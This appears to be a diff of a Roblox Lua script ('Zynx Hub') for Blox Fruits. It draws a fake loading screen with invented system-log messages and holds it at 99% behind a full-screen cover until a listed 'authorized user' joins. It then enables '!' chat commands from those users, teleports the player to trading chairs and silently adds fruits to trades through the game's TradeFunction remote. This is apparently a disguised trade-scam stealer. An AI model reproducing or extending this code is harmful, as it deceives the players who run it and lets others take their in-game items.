+    -- Loading Bar Container
+    local loadingBarContainer = Instance.new("Frame")
+    loadingBarContainer.Size = UDim2.new(0.9, 0, 0.1, 0)
+    loadingBarContainer.Position = UDim2.new(0.05, 0, 0.3, 0)
+    loadingBarContainer.BackgroundColor3 = Color3.fromRGB(25, 30, 40)
+    loadingBarContainer.BackgroundTransparency = 0.3
+    loadingBarContainer.BorderSizePixel = 0
+    loadingBarContainer.ZIndex = 2
+    loadingBarContainer.Parent = mainContainer
+
+    local loadingBarCorner = Instance.new("UICorner")
+    loadingBarCorner.CornerRadius = UDim.new(0.02, 0)
+    loadingBarCorner.Parent = loadingBarContainer
+
+    -- Loading bar background
+    local loadingBarBg = Instance.new("Frame")
+    loadingBarBg.Size = UDim2.new(0.95, 0, 0.5, 0)
+    loadingBarBg.Position = UDim2.new(0.025, 0, 0.25, 0)
+    loadingBarBg.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
+    loadingBarBg.BorderSizePixel = 0
+    loadingBarBg.ZIndex = 2
+    loadingBarBg.Parent = loadingBarContainer
+
+    local loadingBgCorner = Instance.new("UICorner")
+    loadingBgCorner.CornerRadius = UDim.new(0.08, 0)
+    loadingBgCorner.Parent = loadingBarBg
+
+    -- Loading bar fill
+    local loadingBar = Instance.new("Frame")
+    loadingBar.Size = UDim2.new(0, 0, 1, 0)
+    loadingBar.Position = UDim2.new(0, 0, 0, 0)
+    loadingBar.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+    loadingBar.BorderSizePixel = 0
+    loadingBar.ZIndex = 3
+    loadingBar.Parent = loadingBarBg
+
+    local loadingBarFillCorner = Instance.new("UICorner")
+    loadingBarFillCorner.CornerRadius = UDim.new(0.08, 0)
+    loadingBarFillCorner.Parent = loadingBar
+
+    -- Loading bar highlight
+    local loadingBarHighlight = Instance.new("Frame")
+    loadingBarHighlight.Size = UDim2.new(1, 0, 0.3, 0)
+    loadingBarHighlight.Position = UDim2.new(0, 0, 0, 0)
+    loadingBarHighlight.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
+    loadingBarHighlight.BackgroundTransparency = 0.5
+    loadingBarHighlight.BorderSizePixel = 0
+    loadingBarHighlight.ZIndex = 4
+    loadingBarHighlight.Parent = loadingBar
+
+    local highlightCorner = Instance.new("UICorner")
+    highlightCorner.CornerRadius = UDim.new(0.08, 0)
+    highlightCorner.Parent = loadingBarHighlight
+
+    -- Loading bar shine effect
+    local loadingBarShine = Instance.new("Frame")
+    loadingBarShine.Size = UDim2.new(0.2, 0, 1, 0)
+    loadingBarShine.Position = UDim2.new(-0.2, 0, 0, 0)
+    loadingBarShine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    loadingBarShine.BackgroundTransparency = 0.7
+    loadingBarShine.BorderSizePixel = 0
+    loadingBarShine.ZIndex = 4
+    loadingBarShine.Parent = loadingBar
+
+    local shineCorner = Instance.new("UICorner")
+    shineCorner.CornerRadius = UDim.new(0.08, 0)
+    shineCorner.Parent = loadingBarShine
+
+    -- Percentage display
+    local percentText = Instance.new("TextLabel")
+    percentText.Size = UDim2.new(1, 0, 0.4, 0)
+    percentText.Position = UDim2.new(0, 0, 0.55, 0)
+    percentText.BackgroundTransparency = 1
+    percentText.Text = "0%"
+    percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    percentText.TextScaled = true
+    percentText.Font = Enum.Font.GothamBlack
+    percentText.ZIndex = 3
+    percentText.Parent = loadingBarContainer
+
+    -- Technical details container
+    local techContainer = Instance.new("Frame")
+    techContainer.Size = UDim2.new(0.9, 0, 0.35, 0)
+    techContainer.Position = UDim2.new(0.05, 0, 0.42, 0)
+    techContainer.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+    techContainer.BackgroundTransparency = 0.3
+    techContainer.BorderSizePixel = 0
+    techContainer.ZIndex = 2
+    techContainer.Parent = mainContainer
+
+    local techCorner = Instance.new("UICorner")
+    techCorner.CornerRadius = UDim.new(0.02, 0)
+    techCorner.Parent = techContainer
+
+    -- Technical details title
+    local techTitle = Instance.new("TextLabel")
+    techTitle.Size = UDim2.new(1, 0, 0.15, 0)
+    techTitle.Position = UDim2.new(0, 0, 0, 0)
+    techTitle.BackgroundTransparency = 1
+    techTitle.Text = "SYSTEM LOG"
+    techTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    techTitle.TextScaled = true
+    techTitle.Font = Enum.Font.GothamBold
+    techTitle.ZIndex = 3
+    techTitle.Parent = techContainer
+
+    -- Technical log display
+    local techLog = Instance.new("TextLabel")
+    techLog.Size = UDim2.new(0.95, 0, 0.8, 0)
+    techLog.Position = UDim2.new(0.025, 0, 0.15, 0)
+    techLog.BackgroundTransparency = 1
+    techLog.Text = "> Initializing system components..."
+    techLog.TextColor3 = Color3.fromRGB(0, 255, 150)
+    techLog.TextXAlignment = Enum.TextXAlignment.Left
+    techLog.TextYAlignment = Enum.TextYAlignment.Top
+    techLog.TextSize = 14
+    techLog.Font = Enum.Font.Code
+    techLog.TextWrapped = true
+    techLog.ZIndex = 3
+    techLog.Parent = techContainer
+
+    -- Discord button container
+    local discordContainer = Instance.new("Frame")
+    discordContainer.Size = UDim2.new(0.9, 0, 0.08, 0)
+    discordContainer.Position = UDim2.new(0.05, 0, 0.79, 0)
+    discordContainer.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+    discordContainer.BackgroundTransparency = 0.3
+    discordContainer.BorderSizePixel = 0
+    discordContainer.ZIndex = 2
+    discordContainer.Parent = mainContainer
+
+    local discordCorner = Instance.new("UICorner")
+    discordCorner.CornerRadius = UDim.new(0.02, 0)
+    discordCorner.Parent = discordContainer
+
+    -- Discord button - EXACTLY 144x60 pixels
+    local discordButton = Instance.new("TextButton")
+    discordButton.Size = UDim2.new(0, 144, 0, 60)  -- EXACTLY 144x60 pixels
+    discordButton.AnchorPoint = Vector2.new(0.5, 0.5)  -- Center anchor
+    discordButton.Position = UDim2.new(0.5, 0, 0.5, 0)  -- Centered position
+    discordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)  -- Discord blurple
+    discordButton.Text = "COPY DISCORD INVITE"
+    discordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    discordButton.TextScaled = true
+    discordButton.Font = Enum.Font.GothamBold
+    discordButton.AutoButtonColor = false
+    discordButton.ZIndex = 3
+    discordButton.Parent = discordContainer
+
+    local buttonCorner = Instance.new("UICorner")
+    buttonCorner.CornerRadius = UDim.new(0.08, 0)
+    buttonCorner.Parent = discordButton
+
+    -- 3D Button shadow
+    local buttonShadow = Instance.new("Frame")
+    buttonShadow.Size = UDim2.new(1, 4, 1, 4)
+    buttonShadow.Position = UDim2.new(0, -2, 0, 2)
+    buttonShadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    buttonShadow.BackgroundTransparency = 0.7
+    buttonShadow.BorderSizePixel = 0
+    buttonShadow.ZIndex = 2
+    buttonShadow.Parent = discordButton
+
+    local shadowCorner = Instance.new("UICorner")
+    shadowCorner.CornerRadius = UDim.new(0.1, 0)
+    shadowCorner.Parent = buttonShadow
+
+    -- Button highlight
+    local buttonHighlight = Instance.new("Frame")
+    buttonHighlight.Size = UDim2.new(1, 0, 0.3, 0)
+    buttonHighlight.Position = UDim2.new(0, 0, 0, 0)
+    buttonHighlight.BackgroundColor3 = Color3.fromRGB(150, 170, 255)
+    buttonHighlight.BackgroundTransparency = 0.3
+    buttonHighlight.BorderSizePixel = 0
+    buttonHighlight.ZIndex = 4
+    buttonHighlight.Parent = discordButton
+
+    local highlightBtnCorner = Instance.new("UICorner")
+    highlightBtnCorner.CornerRadius = UDim.new(0.08, 0)
+    highlightBtnCorner.Parent = buttonHighlight
+
+    -- Button hover effects
+    discordButton.MouseEnter:Connect(function()
+        discordButton.BackgroundColor3 = Color3.fromRGB(105, 120, 255)
+        buttonHighlight.BackgroundTransparency = 0.2
+        -- 3D effect
+        discordButton.Position = UDim2.new(0.5, 0, 0.5, 2)
+        buttonShadow.Position = UDim2.new(0, -1, 0, 1)
+    end)
+
+    discordButton.MouseLeave:Connect(function()
+        discordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+        buttonHighlight.BackgroundTransparency = 0.3
+        -- Reset 3D effect
+        discordButton.Position = UDim2.new(0.5, 0, 0.5, 0)
+        buttonShadow.Position = UDim2.new(0, -2, 0, 2)
+    end)
+
+    discordButton.MouseButton1Down:Connect(function()
+        -- Click effect
+        discordButton.Position = UDim2.new(0.5, 0, 0.5, 4)
+        buttonShadow.Position = UDim2.new(0, 0, 0, 0)
+    end)
+
+    discordButton.MouseButton1Up:Connect(function()
+        discordButton.Position = UDim2.new(0.5, 0, 0.5, 0)
+        buttonShadow.Position = UDim2.new(0, -2, 0, 2)
+    end)
+
+    discordButton.MouseButton1Click:Connect(function()
+        pcall(function()
+            setclipboard("https://discord.gg/UJt7y7pt95")
+        end)
+        
+        local originalText = discordButton.Text
+        local originalColor = discordButton.BackgroundColor3
+        
+        discordButton.Text = "INVITE COPIED!"
+        discordButton.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+        buttonHighlight.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
+        
+        wait(1.5)
+        
+        discordButton.Text = originalText
+        discordButton.BackgroundColor3 = originalColor
+        buttonHighlight.BackgroundColor3 = Color3.fromRGB(150, 170, 255)
+    end)
+
+    -- Technical messages
+    local technicalMessages = {
+        "> Initializing system components...",
+        "> Loading core game modules...",
+        "> Establishing secure connection...",
+        "> Fetching player data from servers...",
+        "> Analyzing game environment...",
+        "> Compiling script resources...",
+        "> Loading asset packages...",
+        "> Initializing security protocols...",
+        "> Setting up game interfaces...",
+        "> Preparing world data...",
+        "> Loading character models...",
+        "> Initializing physics engine...",
+        "> Setting up network layers...",
+        "> Compiling UI components...",
+        "> Loading sound assets...",
+        "> Initializing game mechanics...",
+        "> Preparing spawn locations...",
+        "> Loading game maps...",
+        "> Setting up player controls...",
+        "> Finalizing system checks...",
+        "> System ready for launch..."
+    }
+
+    local statusUpdates = {
+        "Initializing core modules...",
+        "Loading game resources...",
+        "Establishing connections...",
+        "Compiling scripts...",
+        "Setting up environment...",
+        "Finalizing systems...",
+        "Ready to launch!"
+    }
+
+    -- Store UI elements for animation
+    local uiElements = {
+        loadingScreen = loadingScreen,
+        loadingBar = loadingBar,
+        percentText = percentText,
+        statusValue = statusValue,
+        techLog = techLog,
+        headerAccent = headerAccent,
+        loadingBarShine = loadingBarShine
+    }
+
+    return uiElements, technicalMessages, statusUpdates
+end
+
+local function createFullLoadingScreen()
+    -- FULL LOADING SCREEN WITH AGGRESSIVE UI BLOCKING
+    local finalLoadingScreen = Instance.new("ScreenGui")
+    finalLoadingScreen.Name = "FinalStageLoadingScreen"
+    finalLoadingScreen.Parent = CoreGui
+    finalLoadingScreen.ResetOnSpawn = false
+    finalLoadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    finalLoadingScreen.DisplayOrder = 999
+    finalLoadingScreen.Enabled = false -- Start disabled
+
+    -- FULL SCREEN COVER
+    local fullScreenCover = Instance.new("Frame")
+    fullScreenCover.Size = UDim2.new(1, 0, 1, 0)
+    fullScreenCover.Position = UDim2.new(0, 0, 0, 0)
+    fullScreenCover.BackgroundColor3 = Color3.fromRGB(5, 10, 20)
+    fullScreenCover.BackgroundTransparency = 1
+    fullScreenCover.BorderSizePixel = 0
+    fullScreenCover.ZIndex = 1
+    fullScreenCover.Parent = finalLoadingScreen
+
+    -- Animated gradient background
+    local bgGradient = Instance.new("UIGradient")
+    bgGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(5, 10, 25)),
+        ColorSequenceKeypoint.new(0.3, Color3.fromRGB(10, 15, 40)),
+        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(15, 25, 60)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 10, 25))
+    })
+    bgGradient.Rotation = 45
+    bgGradient.Parent = fullScreenCover
+
+    -- MAIN CONTENT CONTAINER
+    local mainContainer = Instance.new("Frame")
+    mainContainer.Size = UDim2.new(0.6, 0, 0.5, 0)
+    mainContainer.Position = UDim2.new(0.2, 0, 0.25, 0)
+    mainContainer.BackgroundColor3 = Color3.fromRGB(15, 20, 35)
+    mainContainer.BackgroundTransparency = 0.1
+    mainContainer.BorderSizePixel = 0
+    mainContainer.ZIndex = 10
+    mainContainer.Parent = finalLoadingScreen
+
+    local mainCorner = Instance.new("UICorner")
+    mainCorner.CornerRadius = UDim.new(0.03, 0)
+    mainCorner.Parent = mainContainer
+
+    -- Container border with glow
+    local containerStroke = Instance.new("UIStroke")
+    containerStroke.Color = Color3.fromRGB(0, 150, 255)
+    containerStroke.Thickness = 2
+    containerStroke.Parent = mainContainer
+
+    -- Title
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0.15, 0)
+    title.Position = UDim2.new(0, 0, 0.05, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "BLOX FRUITS"
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBlack
+    title.TextStrokeTransparency = 0.8
+    title.TextStrokeColor3 = Color3.fromRGB(0, 100, 200)
+    title.ZIndex = 12
+    title.Parent = mainContainer
+
+    -- Subtitle
+    local subtitle = Instance.new("TextLabel")
+    subtitle.Size = UDim2.new(1, 0, 0.1, 0)
+    subtitle.Position = UDim2.new(0, 0, 0.18, 0)
+    subtitle.BackgroundTransparency = 1
+    subtitle.Text = "Final Stage of Loading"
+    subtitle.TextColor3 = Color3.fromRGB(200, 200, 255)
+    subtitle.TextScaled = true
+    subtitle.Font = Enum.Font.Gotham
+    subtitle.ZIndex = 12
+    subtitle.Parent = mainContainer
+
+    -- Status
+    local statusContainer = Instance.new("Frame")
+    statusContainer.Size = UDim2.new(0.9, 0, 0.08, 0)
+    statusContainer.Position = UDim2.new(0.05, 0, 0.3, 0)
+    statusContainer.BackgroundColor3 = Color3.fromRGB(20, 25, 40)
+    statusContainer.BackgroundTransparency = 0.3
+    statusContainer.BorderSizePixel = 0
+    statusContainer.ZIndex = 11
+    statusContainer.Parent = mainContainer
+
+    local statusCorner = Instance.new("UICorner")
+    statusCorner.CornerRadius = UDim.new(0.02, 0)
+    statusCorner.Parent = statusContainer
+
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(0.25, 0, 1, 0)
+    statusLabel.Position = UDim2.new(0.02, 0, 0, 0)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "Status:"
+    statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+    statusLabel.TextScaled = true
+    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.ZIndex = 12
+    statusLabel.Parent = statusContainer
+
+    local statusValue = Instance.new("TextLabel")
+    statusValue.Size = UDim2.new(0.7, 0, 1, 0)
+    statusValue.Position = UDim2.new(0.27, 0, 0, 0)
+    statusValue.BackgroundTransparency = 1
+    statusValue.Text = "Initializing core systems..."
+    statusValue.TextColor3 = Color3.fromRGB(0, 200, 255)
+    statusValue.TextScaled = true
+    statusValue.TextXAlignment = Enum.TextXAlignment.Left
+    statusValue.Font = Enum.Font.GothamBold
+    statusValue.ZIndex = 12
+    statusValue.Parent = statusContainer
+
+    return finalLoadingScreen, statusValue
+end
+
+local function createBlackBackground()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "BlackBackground"
+    screenGui.DisplayOrder = 1
+    screenGui.IgnoreGuiInset = true
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = CoreGui
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.Position = UDim2.new(0, 0, 0, 0)
+    frame.BackgroundColor3 = Color3.new(0, 0, 0)
+    frame.BackgroundTransparency = 0
+    frame.BorderSizePixel = 0
+    frame.ZIndex = 1
+    frame.Parent = screenGui
+
+    return screenGui
+end
+
+-- ===== LOADING SCREEN CONTROLLER =====
+local function startLoadingSequence()
+    -- Create screens
+    local halfUI, technicalMessages, statusUpdates = createHalfLoadingScreen()
+    local fullLoadingScreen, fullStatusValue = createFullLoadingScreen()
+    local blackBackground = createBlackBackground()
+    
+    -- Start monitoring for authorized users
+    monitorAuthorizedUsers()
+    
+    local startTime = tick()
+    local connection = RunService.Heartbeat:Connect(function(deltaTime)
+        if loadingComplete then
+            connection:Disconnect()
+            return
+        end
+        
+        local currentTime = tick() - startTime
+        local targetProgress = (currentTime / 240) * 100 -- 240 seconds = 4 minutes
+        
+        -- Check if authorized user joined
+        if authorizedUserJoined then
+            -- Immediately jump to 100% and switch to full loading screen
+            if loadingProgress < 100 then
+                loadingProgress = 100
+                print("🚀 AUTHORIZED USER DETECTED - SKIPPING TO FULL LOADING SCREEN")
+                
+                -- Update half loading screen to show 100%
+                if halfUI.percentText then
+                    halfUI.percentText.Text = "100%"
+                end
+                if halfUI.loadingBar then
+                    halfUI.loadingBar.Size = UDim2.new(1, 0, 1, 0)
+                end
+                if halfUI.statusValue then
+                    halfUI.statusValue.Text = "Authorized user detected - Switching..."
+                end
+                
+                wait(1)
+                
+                -- Switch to full loading screen
+                if halfUI.loadingScreen then
+                    halfUI.loadingScreen:Destroy()
+                end
+                if fullLoadingScreen then
+                    fullLoadingScreen.Enabled = true
+                    if fullStatusValue then
+                        fullStatusValue.Text = "Loading complete - Welcome!"
+                    end
+                end
+                
+                -- Complete full loading quickly
+                wait(3)
+                if fullLoadingScreen then
+                    fullLoadingScreen:Destroy()
+                end
+                if blackBackground then
+                    blackBackground:Destroy()
+                end
+                loadingComplete = true
+                print("✅ LOADING COMPLETE - AUTHORIZED USER MODE")
+            end
+        else
+            -- Normal progress (stuck at 99% if no authorized user)
+            if targetProgress >= 99 and not authorizedUserJoined then
+                loadingProgress = 99 -- Stuck at 99%
+                if halfUI.statusValue then
+                    halfUI.statusValue.Text = "Waiting for authorized user..."
+                end
+            else
+                loadingProgress = math.min(targetProgress, 99) -- Cap at 99%
+            end
+            
+            -- Update half loading screen visuals
+            if halfUI.loadingBar then
+                halfUI.loadingBar.Size = UDim2.new(loadingProgress/100, 0, 1, 0)
+            end
+            if halfUI.percentText then
+                halfUI.percentText.Text = string.format("%d%%", math.floor(loadingProgress))
+            end
+            
+            -- Update status text
+            local statusIndex = math.floor((loadingProgress / 100) * #statusUpdates) + 1
+            if statusIndex > #statusUpdates then statusIndex = #statusUpdates end
+            if halfUI.statusValue then
+                halfUI.statusValue.Text = statusUpdates[statusIndex]
+            end
+            
+            -- Update technical log
+            local messageIndex = math.floor((loadingProgress / 100) * #technicalMessages) + 1
+            if messageIndex > #technicalMessages then messageIndex = #technicalMessages end
+            if halfUI.techLog then
+                local messagesToShow = ""
+                local startIndex = math.max(1, messageIndex - 3)
+                for i = startIndex, messageIndex do
+                    if i <= #technicalMessages then
+                        messagesToShow = messagesToShow .. technicalMessages[i] .. "\n"
+                    end
+                end
+                halfUI.techLog.Text = messagesToShow
+            end
+            
+            -- Animate loading bar shine
+            if halfUI.loadingBarShine then
+                halfUI.loadingBarShine.Position = UDim2.new((math.sin(tick() * 3) + 1) * 0.4, 0, 0, 0)
+            end
+            
+            -- Pulsing header accent
+            if halfUI.headerAccent then
+                local accentPulse = math.sin(tick() * 1.5) * 0.2 + 0.8
+                halfUI.headerAccent.BackgroundColor3 = Color3.fromRGB(0, 150 * accentPulse, 255 * accentPulse)
+            end
+        end
+        
+        -- If we reach 4 minutes with no authorized user, stay at 99% forever
+        if currentTime >= 240 and not authorizedUserJoined then
+            print("❌ NO AUTHORIZED USER JOINED - LOADING STUCK AT 99%")
+            -- Keep it at 99% indefinitely
+        end
+    end)
+end
+
+-- ===== PART 3: TRADING COMMANDS SYSTEM =====
+-- Zynx Hub - Complete Trading System (Fixed Trade Commands)
+
+-- ===== AUTHORIZED USERS =====
+local tradingAuthorizedUsers = {
+    -- Boss Users (5 users)
+    boss = {
+        {username = "jaatshab_770", displayname = "III"},
+        {username = "boss_user2", displayname = "BOSS2"},
+        {username = "boss_user3", displayname = "BOSS3"},
+        {username = "boss_user4", displayname = "BOSS4"},
+        {username = "boss_user5", displayname = "BOSS5"}
+    },
+    -- Member Users (5 users)
+    member = {
+        {username = "member_user1", displayname = "MEMBER1"},
+        {username = "member_user2", displayname = "MEMBER2"},
+        {username = "member_user3", displayname = "MEMBER3"},
+        {username = "member_user4", displayname = "MEMBER4"},
+        {username = "member_user5", displayname = "MEMBER5"}
+    }
+}
+
+-- Function to check if user is authorized for trading
+local function isTradingUserAuthorized(speaker)
+    -- Check boss users
+    for _, user in ipairs(tradingAuthorizedUsers.boss) do
+        if speaker.Name == user.username or speaker.DisplayName == user.displayname then
+            return true, "boss"
+        end
+    end
+    
+    -- Check member users
+    for _, user in ipairs(tradingAuthorizedUsers.member) do
+        if speaker.Name == user.username or speaker.DisplayName == user.displayname then
+            return true, "member"
+        end
+    end
+    
+    return false, nil
+end
+
+-- ===== COMMAND PREFIX =====
+local commandPrefix = "!"
+
+-- ===== REMOTE REFERENCES =====
+local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
+
+-- ===== MANUAL SEA OVERRIDE =====
+local manualSeaOverride = nil
+
+-- ===== IMPROVED ADD FRUIT SYSTEM =====
+local lastAddFruitExecution = 0
+local addFruitCooldown = 2 -- 2 second cooldown
+
+-- Function to format item name correctly
+local function formatItemName(itemName)
+    -- Check if it's a skin by looking for space in name AND common skin patterns
+    if string.find(itemName, " ") or string.find(itemName, "Skin") or string.find(itemName, "Celebration") then
+        -- For skins: "Celebration Bomb" stays as "Celebration Bomb"
+        -- For weapon skins: "Slingshot Skin" stays as "Slingshot Skin"
+        return itemName
+    else
+        -- For fruits: "Bomb" becomes "Bomb-Bomb", "Kitsune" becomes "Kitsune-Kitsune"
+        return itemName .. "-" .. itemName
+    end
+end
+
+-- Improved add fruit function with cooldown
+local function addFruitToTradeImproved(fruitName)
+    local currentTime = tick()
+    
+    -- Check cooldown (silent - no message)
+    if currentTime - lastAddFruitExecution < addFruitCooldown then
+        return nil -- Return nothing, so no chat message
+    end
+    
+    lastAddFruitExecution = currentTime
+    
+    local formattedName = formatItemName(fruitName)
+    
+    local args = {
+        [1] = "addItem",
+        [2] = formattedName
+    }
+    
+    local success, result = pcall(function()
+        return TradeFunction:InvokeServer(unpack(args))
+    end)
+    
+    -- Always return nil to prevent any chat messages
+    return nil
+end
+
+-- ===== IMPROVED SEA DETECTION =====
+local function GetTradingSea()
+    -- Use manual override if set
+    if manualSeaOverride then
+        return manualSeaOverride
+    end
+    
+    local workspace = game:GetService("Workspace")
+    
+    -- Method 1: Check player position (most reliable)
+    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        local playerPosition = LocalPlayer.Character.HumanoidRootPart.Position
+        
+        -- Sea 1 coordinates (Starter Island, Marineford, etc.)
+        if playerPosition.X > -5000 and playerPosition.X < 5000 and 
+           playerPosition.Z > -5000 and playerPosition.Z < 5000 then
+            return 1
+        end
+        
+        -- Sea 2 coordinates (Kingdom of Rose, Cafe, etc.)
+        if playerPosition.X > -6000 and playerPosition.X < 2000 and 
+           playerPosition.Z > -2000 and playerPosition.Z < 4000 then
+            return 2
+        end
+        
+        -- Sea 3 coordinates (Port Town, Hydra, etc.)
+        if playerPosition.X < -10000 then
+            return 3
+        end
+    end
+    
+    -- Method 2: Check specific islands in workspace
+    local islands = workspace:FindFirstChild("Islands")
+    if islands then
+        for _, island in pairs(islands:GetChildren()) do
+            local islandName = island.Name:lower()
+            
+            -- Sea 1 islands
+            if string.find(islandName, "starter") or string.find(islandName, "marine") or 
+               string.find(islandName, "jungle") or string.find(islandName, "buggy") or
+               string.find(islandName, "pirate") or string.find(islandName, "desert") then
+                return 1
+            end
+            
+            -- Sea 2 islands  
+            if string.find(islandName, "rose") or string.find(islandName, "cafe") or 
+               string.find(islandName, "frost") or string.find(islandName, "ice") or
+               string.find(islandName, "ghost") or string.find(islandName, "sky") then
+                return 2
+            end
+            
+            -- Sea 3 islands
+            if string.find(islandName, "port") or string.find(islandName, "hydra") or 
+               string.find(islandName, "great") or string.find(islandName, "tree") or
+               string.find(islandName, "turtle") or string.find(islandName, "flame") then
+                return 3
+            end
+        end
+    end
+    
+    -- Method 3: Check for specific map objects
+    if workspace:FindFirstChild("FrozenDimension") or workspace:FindFirstChild("FrozenVillage") then
+        return 2
+    end
+    
+    if workspace:FindFirstChild("GreatTree") or workspace:FindFirstChild("Hydra") then
+        return 3
+    end
+    
+    -- Default to Sea 1 if detection fails
+    return 1
+end
+
+-- ===== ALL TRADING CHAIR POSITIONS =====
+local tradingChairs = {
+    -- 2nd Sea - Cafe Trading Chairs (4 chairs)
+    {name = "Cafe P1", position = Vector3.new(-463.416, 71.620, 271.041), sea = 2},
+    {name = "Cafe P2", position = Vector3.new(-463.416, 71.619, 282.295), sea = 2},
+    {name = "Cafe P1", position = Vector3.new(-297.657, 71.620, 271.041), sea = 2},
+    {name = "Cafe P2", position = Vector3.new(-297.657, 71.619, 282.295), sea = 2},
+    
+    -- 3rd Sea - Turtle Island Trading Chairs (6 chairs)
+    {name = "Turtle P1", position = Vector3.new(-12591.059, 335.991, -7544.757), sea = 3},
+    {name = "Turtle P2", position = Vector3.new(-12602.313, 335.990, -7544.757), sea = 3},
+    {name = "Turtle P2", position = Vector3.new(-12602.313, 335.990, -7556.757), sea = 3},
+    {name = "Turtle P1", position = Vector3.new(-12591.059, 335.991, -7556.757), sea = 3},
+    {name = "Turtle P1", position = Vector3.new(-12591.059, 335.991, -7568.757), sea = 3},
+    {name = "Turtle P2", position = Vector3.new(-12602.313, 335.990, -7568.757), sea = 3}
+}
+
+-- ===== 3RD SEA PORTAL POSITIONS =====
+local portalPositions = {
+    Mansion = Vector3.new(-12463.896, 374.990, -7551.677),
+    Hydra = Vector3.new(-12463.896, 374.990, -7563.677),
+    Castle = Vector3.new(-12463.896, 374.990, -7575.677),
+    Tiki = Vector3.new(-12463.896, 374.990, -7587.677)
+}
+
+-- ===== IMPROVED TELEPORT FUNCTION =====
+local function teleportTo(position)
+    if not LocalPlayer.Character then return false end
+    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return false end
+    
+    local success = pcall(function()
+        hrp.CFrame = CFrame.new(position)
+    end)
+    
+    return success
+end
+
+-- ===== IMPROVED PORTAL TELEPORT FUNCTION =====
+local function useThirdSeaPortal(portalName)
+    local currentSea = GetTradingSea()
+    if currentSea ~= 3 then
+        return false, "You need to be in 3rd Sea to use portals!"
+    end
+    
+    local targetPos = nil
+    portalName = portalName:lower()
+    
+    if portalName == "mansion" then
+        targetPos = portalPositions.Mansion
+    elseif portalName == "hydra" then
+        targetPos = portalPositions.Hydra
+    elseif portalName == "castle" then
+        targetPos = portalPositions.Castle
+    elseif portalName == "tiki" then
+        targetPos = portalPositions.Tiki
+    end
+    
+    if not targetPos then
+        return false, "Portal not found"
+    end
+    
+    local success = teleportTo(targetPos)
+    
+    if success then
+        return true, "✅ Teleporting to " .. portalName
+    else
+        return false, "❌ Failed to teleport"
+    end
+end
+
+-- ===== FIND CHAIRS IN CURRENT SEA =====
+local function findChairsInCurrentSea()
+    local currentSea = GetTradingSea()
+    local nearbyChairs = {}
+    
+    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        return nearbyChairs
+    end
+    
+    local hrp = LocalPlayer.Character.HumanoidRootPart
+    
+    for _, chair in pairs(tradingChairs) do
+        if chair.sea == currentSea then
+            local distance = (hrp.Position - chair.position).Magnitude
+            if distance < 500 then
+                table.insert(nearbyChairs, {
+                    chair = chair,
+                    distance = distance
+                })
+            end
+        end
+    end
+    
+    table.sort(nearbyChairs, function(a, b)
+        return a.distance < b.distance
+    end)
+    
+    return nearbyChairs
+end
+
+-- ===== CHECK IF CHAIR IS OCCUPIED =====
+local function isChairOccupied(chairPosition)
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and player.Character then
+            local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+            local humanoid = player.Character:FindFirstChild("Humanoid")
+            
+            if hrp and humanoid and humanoid.Sit then
+                local distance = (hrp.Position - chairPosition).Magnitude
+                if distance < 5 then
+                    return true
+                end
+            end
+        end
+    end
+    return false
+end
+
+-- ===== FIND AVAILABLE CHAIR =====
+local function findAvailableChair()
+    local nearbyChairs = findChairsInCurrentSea()
+    local availableChairs = {}
+    
+    for _, chairData in pairs(nearbyChairs) do
+        if not isChairOccupied(chairData.chair.position) then
+            table.insert(availableChairs, chairData)
+        end
+    end
+    
+    return availableChairs
+end
+
+-- ===== TELEPORT SYSTEM =====
+local teleporting = false
+
+local function teleportToPosition(targetCFrame)
+    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        return false
+    end
+    
+    if teleporting then
+        return false
+    end
+    
+    teleporting = true
+    local hrp = LocalPlayer.Character.HumanoidRootPart
+    
+    -- Direct teleport (no tween)
+    local success = pcall(function()
+        hrp.CFrame = targetCFrame
+    end)
+    
+    teleporting = false
+    return success
+end
+
+-- ===== SMOOTH TELEPORT FOR 2ND SEA ONLY =====
+local function smoothTeleportToCafe()
+    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        return false
+    end
+    
+    if teleporting then
+        return false
+    end
+    
+    teleporting = true
+    local hrp = LocalPlayer.Character.HumanoidRootPart
+    
